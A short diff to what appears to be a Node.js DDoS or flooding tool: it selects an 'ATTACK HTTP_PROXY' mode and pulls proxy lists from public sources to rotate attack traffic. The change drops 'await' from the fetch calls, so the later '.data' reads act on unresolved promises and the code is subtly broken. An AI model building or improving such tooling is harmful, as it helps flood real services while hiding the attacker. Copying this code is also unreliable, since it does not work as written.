@@ -28,14 +28,14 @@ if (process.argv.length < 8){
             console.log("ATTACK BYPASS")
         } else if (process.argv[5] == 'auto'){
             console.log("ATTACK HTTP_PROXY")
-            const proxyscrape_http = await axios.get('https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all');
-            const proxy_list_http = await axios.get('https://www.proxy-list.download/api/v1/get?type=http');
-            const raw_github_http = await axios.get('https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt');
-            const proxies_http = await axios.get('https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt');
-            const proxies2_http = await axios.get('https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-https.txt');
-            const proxies3_http = await axios.get('https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks4.txt');
-            const proxies4_http = await axios.get('https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks5.txt');
-            const proxies5_http = await axios.get('https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies.txt');
+            const proxyscrape_http = axios.get('https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all');
+            const proxy_list_http = axios.get('https://www.proxy-list.download/api/v1/get?type=http');
+            const raw_github_http = axios.get('https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt');
+            const proxies_http = axios.get('https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt');
+            const proxies2_http = axios.get('https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-https.txt');
+            const proxies3_http = axios.get('https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks4.txt');
+            const proxies4_http = axios.get('https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks5.txt');
+            const proxies5_http = axios.get('https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies.txt');
             var proxy = proxyscrape_http.data.replace(/\r/g, '').split('\n');
             var proxy = proxy_list_http.data.replace(/\r/g, '').split('\n');
             var proxy = raw_github_http.data.replace(/\r/g, '').split('\n');
